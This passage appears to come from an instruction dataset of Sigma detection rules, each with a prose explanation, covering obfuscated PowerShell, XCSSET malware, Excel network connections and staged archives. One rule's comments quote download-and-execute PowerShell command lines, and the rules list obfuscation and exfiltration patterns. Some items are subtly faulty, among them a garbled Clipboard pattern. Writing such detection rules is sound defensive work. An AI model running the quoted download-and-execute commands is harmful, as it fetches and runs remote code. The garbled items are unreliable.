    "instruction": "Build a Sigma rule with the goal of detecting The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the use of the CrackMapExec pentesting framework which implements a PowerShell obfuscation technique with specific identifiable static strings, you should monitor for the creation of processes on Windows systems, specifically focusing on executions of 'powershell.exe' or 'pwsh.exe'. Also, watch for cases where the original file names are tagged as 'PowerShell.EXE' or 'pwsh.dll'. Additionally, investigate the command line inputs for patterns that include 'join*split', along with several obfuscated indications such as '($ShellId[1]+$ShellId[13]+'x')', '($PSHome[*]+$PSHOME[*]+', '($env:Public[13]+$env:Public[5]+'x')', '($env:ComSpec[4,*,25]-Join'')', and '[1,3]+'x'-Join'')'. These patterns are indicative of attempts to obscure the true nature of PowerShell commands, which is a common tactic in penetration testing and malicious activities alike. It\u2019s crucial to capture log details like the Computer Name, User, and CommandLine as they are instrumental in investigating and contextualizing the suspicious activity. Due to the obfuscation techniques used, false positives are considered unknown, hence requiring careful analysis. The detection level for this behavior is considered high, emphasizing the need for immediate and thorough investigation upon triggers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains:\n            - 'join*split'\n            # Line 343ff\n            - '( $ShellId[1]+$ShellId[13]+''x'')'\n            - '( $PSHome[*]+$PSHOME[*]+'\n            - '( $env:Public[13]+$env:Public[5]+''x'')'\n            - '( $env:ComSpec[4,*,25]-Join'''')'\n            - '[1,3]+''x''-Join'''')'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        - OriginalFileName:\n            - 'PowerShell.EXE'\n            - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains:\n            - 'join*split'\n            # Line 343ff\n            - '( $ShellId[1]+$ShellId[13]+''x'')'\n            - '( $PSHome[*]+$PSHOME[*]+'\n            - '( $env:Public[13]+$env:Public[5]+''x'')'\n            - '( $env:ComSpec[4,*,25]-Join'''')'\n            - '[1,3]+''x''-Join'''')'\n    condition: all of selection_*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule.",
      "answer": "In order to detect the use of the CrackMapExec pentesting framework which implements a PowerShell obfuscation technique with specific identifiable static strings, you should monitor for the creation of processes on Windows systems, specifically focusing on executions of 'powershell.exe' or 'pwsh.exe'. Also, watch for cases where the original file names are tagged as 'PowerShell.EXE' or 'pwsh.dll'. Additionally, investigate the command line inputs for patterns that include 'join*split', along with several obfuscated indications such as '($ShellId[1]+$ShellId[13]+'x')', '($PSHome[*]+$PSHOME[*]+', '($env:Public[13]+$env:Public[5]+'x')', '($env:ComSpec[4,*,25]-Join'')', and '[1,3]+'x'-Join'')'. These patterns are indicative of attempts to obscure the true nature of PowerShell commands, which is a common tactic in penetration testing and malicious activities alike. It\u2019s crucial to capture log details like the Computer Name, User, and CommandLine as they are instrumental in investigating and contextualizing the suspicious activity. Due to the obfuscation techniques used, false positives are considered unknown, hence requiring careful analysis. The detection level for this behavior is considered high, emphasizing the need for immediate and thorough investigation upon triggers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292.\nYou will likely have to tune this rule for your organization, but it is certainly something you should look for and could have applications for malicious activity beyond CVE-2021-42292.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292, you should: \n\nMonitor network connections made by the Excel application on Windows systems, focusing on connections that are initiated by it. Pay particular attention to connections where the destination IP address is not within the IPv6 format and avoids the commonly used private IP address ranges such as '10.x.x.x', '192.168.x.x', and '172.16.x.x' to '172.31.x.x', including the loopback address '127.0.0.1'. These conditions help in identifying potentially malicious activity where Excel might be used as a vector for attack, specifically targeting vulnerabilities like CVE-2021-42292. \n\nIt's important to tune out legitimate connections often seen in business environments, including those to domains related to Microsoft or other operational needs, and connections to templates or resources that might be hosted on internal or trusted external sites. Given the high likelihood of encountering benign triggers due to regular use of Excel in organizational settings, it's advised to regularly review and refine the detection criteria based on observed traffic patterns and business use cases to minimize false positives. This tailored approach will help in maintaining an effective detection strategy for monitoring and mitigating potential security threats leveraging Excel as an attack vector.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\excel.exe'\n        Initiated: 'true'\n        DestinationIsIpv6: 'false'\n    filter:\n        DestinationIp|startswith:\n            - '10.'\n            - '192.168.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '127.0.0.1'\n    condition: selection and not filter\nfalsepositives:\n    - You may have to tune certain domains out that Excel may call out to, such as microsoft or other business use case domains.\n    - Office documents commonly have templates that refer to external addresses, like sharepoint.ourcompany.com may have to be tuned.\n    - It is highly recommended to baseline your activity and tune out common business use cases.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\excel.exe'\n        Initiated: 'true'\n        DestinationIsIpv6: 'false'\n    filter:\n        DestinationIp|startswith:\n            - '10.'\n            - '192.168.'\n            - '172.16.'\n            - '172.17.'\n            - '172.18.'\n            - '172.19.'\n            - '172.20.'\n            - '172.21.'\n            - '172.22.'\n            - '172.23.'\n            - '172.24.'\n            - '172.25.'\n            - '172.26.'\n            - '172.27.'\n            - '172.28.'\n            - '172.29.'\n            - '172.30.'\n            - '172.31.'\n            - '127.0.0.1'\n    condition: selection and not filter\nfalsepositives:\n    - You may have to tune certain domains out that Excel may call out to, such as microsoft or other business use case domains.\n    - Office documents commonly have templates that refer to external addresses, like sharepoint.ourcompany.com may have to be tuned.\n    - It is highly recommended to baseline your activity and tune out common business use cases.\nlevel: medium\n",
      "question": "an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292.\nYou will likely have to tune this rule for your organization, but it is certainly something you should look for and could have applications for malicious activity beyond CVE-2021-42292.\n",
      "answer": "In order to detect an Excel process that opens suspicious network connections to non-private IP addresses, and attempts to cover CVE-2021-42292, you should: \n\nMonitor network connections made by the Excel application on Windows systems, focusing on connections that are initiated by it. Pay particular attention to connections where the destination IP address is not within the IPv6 format and avoids the commonly used private IP address ranges such as '10.x.x.x', '192.168.x.x', and '172.16.x.x' to '172.31.x.x', including the loopback address '127.0.0.1'. These conditions help in identifying potentially malicious activity where Excel might be used as a vector for attack, specifically targeting vulnerabilities like CVE-2021-42292. \n\nIt's important to tune out legitimate connections often seen in business environments, including those to domains related to Microsoft or other operational needs, and connections to templates or resources that might be hosted on internal or trusted external sites. Given the high likelihood of encountering benign triggers due to regular use of Excel in organizational settings, it's advised to regularly review and refine the detection criteria based on observed traffic patterns and business use cases to minimize false positives. This tailored approach will help in maintaining an effective detection strategy for monitoring and mitigating potential security threats leveraging Excel as an attack vector."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated Powershell via use Clip.exe in Scripts.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated PowerShell via use Clip.exe in Scripts, you should focus on monitoring Windows security logs, specifically looking for instances where the \"System Security Extension\" audit subcategory has been enabled to record Event ID (EID) 4697. This specific event ID is vital as it logs the creation or installation of a service, an action which can be used maliciously, especially when PowerShell commands are designed to evade detection by leveraging the clipboard utility (Clip.exe) as part of their process. \n\nIn your detection strategy, pay particular attention to any service creation logs where the Service File Name includes references to 'Clipboard' or begins with 'i'. These service file names are indicators that the clipboard utility is being used in a manner that is potentially malicious, often as part of an obfuscation technique to hide the true purpose or actions of a PowerShell script.\n\nConsider any hits on these criteria to be of high importance due to their potential for indicating malicious activity. However, be aware that there could be unknown false positives, as legitimate services might coincidentally meet these criteria under very rare circumstances. \n\nThe tactics associated with this kind of detection include \"Execution\" and \"Defense Evasion,\" as the attackers are executing PowerShell scripts and attempting to evade detection through the use of obfuscation techniques involving system utilities like Clip.exe. This approach highlights the importance of tight monitoring and control over script execution and privilege escalation within a Windows environment to mitigate such threats effectively.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains: '(Clipboard|i'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: The 'System Security Extension' audit subcategory need to be enabled to log the EID 4697\ndetection:\n    selection:\n        EventID: 4697\n        ServiceFileName|contains: '(Clipboard|i'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated Powershell via use Clip.exe in Scripts",
      "answer": "In order to detect obfuscated PowerShell via use Clip.exe in Scripts, you should focus on monitoring Windows security logs, specifically looking for instances where the \"System Security Extension\" audit subcategory has been enabled to record Event ID (EID) 4697. This specific event ID is vital as it logs the creation or installation of a service, an action which can be used maliciously, especially when PowerShell commands are designed to evade detection by leveraging the clipboard utility (Clip.exe) as part of their process. \n\nIn your detection strategy, pay particular attention to any service creation logs where the Service File Name includes references to 'Clipboard' or begins with 'i'. These service file names are indicators that the clipboard utility is being used in a manner that is potentially malicious, often as part of an obfuscation technique to hide the true purpose or actions of a PowerShell script.\n\nConsider any hits on these criteria to be of high importance due to their potential for indicating malicious activity. However, be aware that there could be unknown false positives, as legitimate services might coincidentally meet these criteria under very rare circumstances. \n\nThe tactics associated with this kind of detection include \"Execution\" and \"Defense Evasion,\" as the attackers are executing PowerShell scripts and attempting to evade detection through the use of obfuscation techniques involving system utilities like Clip.exe. This approach highlights the importance of tight monitoring and control over script execution and privilege escalation within a Windows environment to mitigate such threats effectively."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Obfuscated use of stdin to execute PowerShell.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect obfuscated use of stdin to execute PowerShell, you should focus on monitoring Windows system service logs, specifically targeting events recorded by the Service Control Manager. Look for event ID 7045, which pertains to service installations. The critical indicator to watch for involves service installation commands that invoke PowerShell via the command line (cmd) using either the '/c' or '/r' switch to carry out commands. These commands are particularly suspicious when they include both 'cmd' and 'powershell' within the service's binary path or ImagePath.\n\nMoreover, signs of obfuscation and potential evasion techniques become apparent when the ImagePath contains specific patterns. These include the presence of 'noexit', which aims to keep the PowerShell session open, and sequences combining 'input' with the '$' character, suggesting the script is attempting to read from stdin in a manner that might not be straightforward. Such combinations are often employed to obscure the command's true nature, making it harder to detect malicious activities.\n\nTo efficiently detect these behaviors, ensure that your detection mechanisms capture all instances where the conditions mentioned above are met simultaneously. However, be aware that there might be rare legitimate uses that trigger these indicators, so consider these as high-level alerts that require manual verification to confirm their malicious intent.\n\nBy focusing on these specific patterns and behaviors in the Windows system service logs, you can identify attempts to execute PowerShell scripts in a manner that seeks to evade detection through obfuscation, which is a common tactic in various attack scenarios such as Initial Access, Execution, and Defense Evasion.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_main:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        # ImagePath|re: '.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\"'\n        # Example 1: c:\\windows\\sYstEm32\\CmD.eXE /C\"echO\\Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -NoEXiT -\"\n        # Example 2: c:\\WiNDOws\\sysTEm32\\cmd.EXe /C \" ECHo Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -nol ${EXEcUtIONCONTeXT}.INvOkEComMANd.InvOKEScRIPt( $InpUt )\"\n        ImagePath|contains|all:\n            - 'cmd'\n            - 'powershell'\n        ImagePath|contains:\n            - '/c'\n            - '/r'\n    selection_other:\n        - ImagePath|contains: 'noexit'\n        - ImagePath|contains|all:\n            - 'input'\n            - '$'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection_main:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        # ImagePath|re: '.*cmd.{0,5}(?:\\/c|\\/r).+powershell.+(?:\\$\\{?input\\}?|noexit).+\\\"'\n        # Example 1: c:\\windows\\sYstEm32\\CmD.eXE /C\"echO\\Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -NoEXiT -\"\n        # Example 2: c:\\WiNDOws\\sysTEm32\\cmd.EXe /C \" ECHo Invoke-Expression (New-Object Net.WebClient).DownloadString | POwersHELl -nol ${EXEcUtIONCONTeXT}.INvOkEComMANd.InvOKEScRIPt( $InpUt )\"\n        ImagePath|contains|all:\n            - 'cmd'\n            - 'powershell'\n        ImagePath|contains:\n            - '/c'\n            - '/r'\n    selection_other:\n        - ImagePath|contains: 'noexit'\n        - ImagePath|contains|all:\n            - 'input'\n            - '$'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Obfuscated use of stdin to execute PowerShell",
      "answer": "In order to detect obfuscated use of stdin to execute PowerShell, you should focus on monitoring Windows system service logs, specifically targeting events recorded by the Service Control Manager. Look for event ID 7045, which pertains to service installations. The critical indicator to watch for involves service installation commands that invoke PowerShell via the command line (cmd) using either the '/c' or '/r' switch to carry out commands. These commands are particularly suspicious when they include both 'cmd' and 'powershell' within the service's binary path or ImagePath.\n\nMoreover, signs of obfuscation and potential evasion techniques become apparent when the ImagePath contains specific patterns. These include the presence of 'noexit', which aims to keep the PowerShell session open, and sequences combining 'input' with the '$' character, suggesting the script is attempting to read from stdin in a manner that might not be straightforward. Such combinations are often employed to obscure the command's true nature, making it harder to detect malicious activities.\n\nTo efficiently detect these behaviors, ensure that your detection mechanisms capture all instances where the conditions mentioned above are met simultaneously. However, be aware that there might be rare legitimate uses that trigger these indicators, so consider these as high-level alerts that require manual verification to confirm their malicious intent.\n\nBy focusing on these specific patterns and behaviors in the Windows system service logs, you can identify attempts to execute PowerShell scripts in a manner that seeks to evade detection through obfuscation, which is a common tactic in various attack scenarios such as Initial Access, Execution, and Defense Evasion."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Identifies the execution traces of the XCSSET malware. XCSSET is a macOS trojan that primarily spreads via Xcode projects and maliciously modifies applications. Infected users are also vulnerable to having their credentials, accounts, and other vital data stolen..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify the execution traces of the XCSSET malware, a macOS trojan that primarily spreads via Xcode projects and maliciously modifies applications, leaving infected users vulnerable to stolen credentials, accounts, and other vital data, you should: \nLook for process creation events on macOS systems that match specific conditions indicative of this malware's activity. Monitor for the usage of the 'curl' command initiated by '/bash' to access suspicious URLs containing '/sys/log.php', '/sys/prepod.php', or '/sys/bin/Pods', as these may be attempts to communicate with a command and control server. Also, watch out for processes initiated by '/bash' using 'osacompile' or 'plutil' to manipulate files or applications, specifically when the command lines include '/Users/' and '/Library/Group Containers/', indicating tampering with user data or applications. Additionally, the creation of zip archives targeting directories within '/Users/' and '/Library/Group Containers/' should be scrutinized if the 'zip' command is involved, as this could suggest data exfiltration attempts. Lastly, any command line containing 'https://' is of interest due to potential malicious network communication. The identified behaviors are tagged under command and control tactics, revealing efforts to manage and control compromised systems remotely.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: macos\ntags:\n    - attack.command_and_control\ndetection:\n    selection_1_curl:\n        ParentImage|endswith: '/bash'\n        Image|endswith: '/curl'\n        CommandLine|contains:\n            - '/sys/log.php'\n            - '/sys/prepod.php'\n            - '/sys/bin/Pods'\n    selection_1_https:\n        CommandLine|contains: 'https://'\n    selection_other_1:\n        ParentImage|endswith: '/bash'\n        Image|endswith: '/osacompile'\n        CommandLine|contains|all:\n            - '/Users/'\n            - '/Library/Group Containers/'\n    selection_other_2:\n        ParentImage|endswith: '/bash'\n        Image|endswith: '/plutil'\n        CommandLine|contains|all:\n            - 'LSUIElement'\n            - '/Users/'\n            - '/Library/Group Containers/'\n    selection_other_3:\n        Image|endswith: '/zip'\n        CommandLine|contains|all:\n            - '-r'\n            - '/Users/'\n            - '/Library/Group Containers/'\n    condition: all of selection_1_* or 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: macos\ntags:\n    - attack.command_and_control\ndetection:\n    selection_1_curl:\n        ParentImage|endswith: '/bash'\n        Image|endswith: '/curl'\n        CommandLine|contains:\n            - '/sys/log.php'\n            - '/sys/prepod.php'\n            - '/sys/bin/Pods'\n    selection_1_https:\n        CommandLine|contains: 'https://'\n    selection_other_1:\n        ParentImage|endswith: '/bash'\n        Image|endswith: '/osacompile'\n        CommandLine|contains|all:\n            - '/Users/'\n            - '/Library/Group Containers/'\n    selection_other_2:\n        ParentImage|endswith: '/bash'\n        Image|endswith: '/plutil'\n        CommandLine|contains|all:\n            - 'LSUIElement'\n            - '/Users/'\n            - '/Library/Group Containers/'\n    selection_other_3:\n        Image|endswith: '/zip'\n        CommandLine|contains|all:\n            - '-r'\n            - '/Users/'\n            - '/Library/Group Containers/'\n    condition: all of selection_1_* or 1 of selection_other_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Identifies the execution traces of the XCSSET malware. XCSSET is a macOS trojan that primarily spreads via Xcode projects and maliciously modifies applications. Infected users are also vulnerable to having their credentials, accounts, and other vital data stolen.",
      "answer": "In order to identify the execution traces of the XCSSET malware, a macOS trojan that primarily spreads via Xcode projects and maliciously modifies applications, leaving infected users vulnerable to stolen credentials, accounts, and other vital data, you should: \nLook for process creation events on macOS systems that match specific conditions indicative of this malware's activity. Monitor for the usage of the 'curl' command initiated by '/bash' to access suspicious URLs containing '/sys/log.php', '/sys/prepod.php', or '/sys/bin/Pods', as these may be attempts to communicate with a command and control server. Also, watch out for processes initiated by '/bash' using 'osacompile' or 'plutil' to manipulate files or applications, specifically when the command lines include '/Users/' and '/Library/Group Containers/', indicating tampering with user data or applications. Additionally, the creation of zip archives targeting directories within '/Users/' and '/Library/Group Containers/' should be scrutinized if the 'zip' command is involved, as this could suggest data exfiltration attempts. Lastly, any command line containing 'https://' is of interest due to potential malicious network communication. The identified behaviors are tagged under command and control tactics, revealing efforts to manage and control compromised systems remotely."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration, you should monitor Windows PowerShell module logs for specific command-line patterns that indicate such activity. This involves tracking commands that utilize the 'Compress-Archive' function, a part of PowerShell used to create zip archives. Specifically, you should look for commands that include both the '-Path' and '-DestinationPath' parameters, indicating the source files to compress and the location where the compressed archive should be stored. It's critical to focus on commands that specify the destination path as the Windows temporary folder, denoted by `$env:TEMP\\`. This pattern of behavior is indicative of attackers leveraging built-in tools to compress potentially sensitive information before exfiltration, aligning with tactics and techniques such as Resource Development and Collection. While this detection strategy is important for identifying suspicious zipping activity, it's also advised to be aware of potential unknown false positives, given the legitimate use of 'Compress-Archive' in non-malicious contexts. The monitoring of these activities is categorized as medium level due to the possibility of both legitimate and malicious use cases.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        ContextInfo|contains|all:\n            - 'Compress-Archive '\n            - ' -Path '\n            - ' -DestinationPath '\n            - '$env:TEMP\\'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_module\n    definition: 0ad03ef1-f21b-4a79-8ce8-e6900c54b65b\ndetection:\n    selection_4103:\n        ContextInfo|contains|all:\n            - 'Compress-Archive '\n            - ' -Path '\n            - ' -DestinationPath '\n            - '$env:TEMP\\'\n    condition: selection_4103\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration",
      "answer": "In order to use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration, you should monitor Windows PowerShell module logs for specific command-line patterns that indicate such activity. This involves tracking commands that utilize the 'Compress-Archive' function, a part of PowerShell used to create zip archives. Specifically, you should look for commands that include both the '-Path' and '-DestinationPath' parameters, indicating the source files to compress and the location where the compressed archive should be stored. It's critical to focus on commands that specify the destination path as the Windows temporary folder, denoted by `$env:TEMP\\`. This pattern of behavior is indicative of attackers leveraging built-in tools to compress potentially sensitive information before exfiltration, aligning with tactics and techniques such as Resource Development and Collection. While this detection strategy is important for identifying suspicious zipping activity, it's also advised to be aware of potential unknown false positives, given the legitimate use of 'Compress-Archive' in non-malicious contexts. The monitoring of these activities is categorized as medium level due to the possibility of both legitimate and malicious use cases."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious file based on their extension being created in \"C:\\PerfLogs\\\", you should monitor file events in Windows environments, especially focusing on files created in the \"C:\\PerfLogs\\\" directory. Pay close attention to files with the extensions '.7z', '.bat', '.bin', '.chm', '.dll', '.exe', '.hta', '.lnk', '.ps1', '.psm1', '.py', '.scr', '.sys', '.vbe', '.vbs', and '.zip'. These extensions are commonly associated with executable and potentially malicious content, unlike the typical \".etl\" files expected in this directory. The detection of files with these extensions being created in the specified directory should raise alerts, as it is unlikely for such activities to occur under normal circumstances, thus indicating a potential security threat.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\PerfLogs\\'\n        TargetFilename|endswith:\n            - '.7z'\n            - '.bat'\n            - '.bin'\n            - '.chm'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.lnk'\n            - '.ps1'\n            - '.psm1'\n            - '.py'\n            - '.scr'\n            - '.sys'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_event\n    product: windows\ndetection:\n    selection:\n        TargetFilename|startswith: 'C:\\PerfLogs\\'\n        TargetFilename|endswith:\n            - '.7z'\n            - '.bat'\n            - '.bin'\n            - '.chm'\n            - '.dll'\n            - '.exe'\n            - '.hta'\n            - '.lnk'\n            - '.ps1'\n            - '.psm1'\n            - '.py'\n            - '.scr'\n            - '.sys'\n            - '.vbe'\n            - '.vbs'\n            - '.zip'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: medium\n",
      "question": "suspicious file based on their extension being created in \"C:\\PerfLogs\\\". Note that this directory mostly contains \".etl\" files",
      "answer": "In order to detect suspicious file based on their extension being created in \"C:\\PerfLogs\\\", you should monitor file events in Windows environments, especially focusing on files created in the \"C:\\PerfLogs\\\" directory. Pay close attention to files with the extensions '.7z', '.bat', '.bin', '.chm', '.dll', '.exe', '.hta', '.lnk', '.ps1', '.psm1', '.py', '.scr', '.sys', '.vbe', '.vbs', and '.zip'. These extensions are commonly associated with executable and potentially malicious content, unlike the typical \".etl\" files expected in this directory. The detection of files with these extensions being created in the specified directory should raise alerts, as it is unlikely for such activities to occur under normal circumstances, thus indicating a potential security threat."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of shell scripts under the \"profile.d\" path..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of shell scripts under the \"profile.d\" path, you should: Monitor Linux file events specifically focusing on the creation or modification of files within the \"/etc/profile.d/\" directory. Pay particular attention to files that have extensions '.csh' or '.sh', as these are shell scripts. It's important to be aware that encountering such events could, at times, be due to legitimate activities. These could include the addition of shell scripts as part of system configurations or during software installations and updates, which commonly occur in the \"profile.d\" directory. Such legitimate actions might trigger false alerts. Therefore, it might be necessary to refine the detection strategy by excluding known good scripts or by integrating this detection with additional contextual events to minimize false positives. The initial severity level for these detections is considered low, allowing for adjustments based on specific environmental needs or after conducting further analysis to better distinguish between benign and malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '/etc/profile.d/'\n        TargetFilename|endswith:\n            - '.csh'\n            - '.sh'\n    condition: selection\nfalsepositives:\n    - Legitimate shell scripts in the \"profile.d\" directory could be common in your environment. Apply additional filter accordingly via \"image\", by adding specific filenames you \"trust\" or by correlating it with other events.\n    - Regular file creation during system update or software installation by the package manager\nlevel: low # Can be increased to a higher level after some tuning\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|contains: '/etc/profile.d/'\n        TargetFilename|endswith:\n            - '.csh'\n            - '.sh'\n    condition: selection\nfalsepositives:\n    - Legitimate shell scripts in the \"profile.d\" directory could be common in your environment. Apply additional filter accordingly via \"image\", by adding specific filenames you \"trust\" or by correlating it with other events.\n    - Regular file creation during system update or software installation by the package manager\nlevel: low # Can be increased to a higher level after some tuning\n",
      "question": "creation of shell scripts under the \"profile.d\" path.",
      "answer": "In order to detect the creation of shell scripts under the \"profile.d\" path, you should: Monitor Linux file events specifically focusing on the creation or modification of files within the \"/etc/profile.d/\" directory. Pay particular attention to files that have extensions '.csh' or '.sh', as these are shell scripts. It's important to be aware that encountering such events could, at times, be due to legitimate activities. These could include the addition of shell scripts as part of system configurations or during software installations and updates, which commonly occur in the \"profile.d\" directory. Such legitimate actions might trigger false alerts. Therefore, it might be necessary to refine the detection strategy by excluding known good scripts or by integrating this detection with additional contextual events to minimize false positives. The initial severity level for these detections is considered low, allowing for adjustments based on specific environmental needs or after conducting further analysis to better distinguish between benign and malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting signs of the WMI script host process \"scrcons.exe\" loading scripting DLLs which could indciates WMI ActiveScriptEventConsumers EventConsumers activity..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect signs of the WMI script host process \"scrcons.exe\" loading scripting DLLs which could indicate WMI ActiveScriptEventConsumers EventConsumers activity, you should monitor Windows image load events for instances where the \"scrcons.exe\" is involved alongside the loading of specific scripting Dynamic Link Libraries (DLLs). These libraries include 'vbscript.dll', 'wbemdisp.dll', 'wshom.ocx', and 'scrrun.dll'. The presence of these activities may signal the malicious use of Windows Management Instrumentation (WMI) for executing scripts, a technique often utilized by attackers for persistence, lateral movement, or information gathering. It is important to note that there may be legitimate uses of these DLLs, and certain devices, such as Dell computers, might trigger these alerts under normal operations, like adjusting screen brightness via the keyboard. The alert level for these findings is classified as medium, indicating a need for investigations to ascertain the nature of these events further.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\scrcons.exe'\n        ImageLoaded|endswith:\n            - '\\vbscript.dll'\n            - '\\wbemdisp.dll'\n            - '\\wshom.ocx'\n            - '\\scrrun.dll'\n    condition: selection\nfalsepositives:\n    - Legitimate event consumers\n    - Dell computers on some versions register an event consumer that is known to cause false positives when brightness is changed by the corresponding keyboard button\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\scrcons.exe'\n        ImageLoaded|endswith:\n            - '\\vbscript.dll'\n            - '\\wbemdisp.dll'\n            - '\\wshom.ocx'\n            - '\\scrrun.dll'\n    condition: selection\nfalsepositives:\n    - Legitimate event consumers\n    - Dell computers on some versions register an event consumer that is known to cause false positives when brightness is changed by the corresponding keyboard button\nlevel: medium\n",
      "question": "signs of the WMI script host process \"scrcons.exe\" loading scripting DLLs which could indciates WMI ActiveScriptEventConsumers EventConsumers activity.",
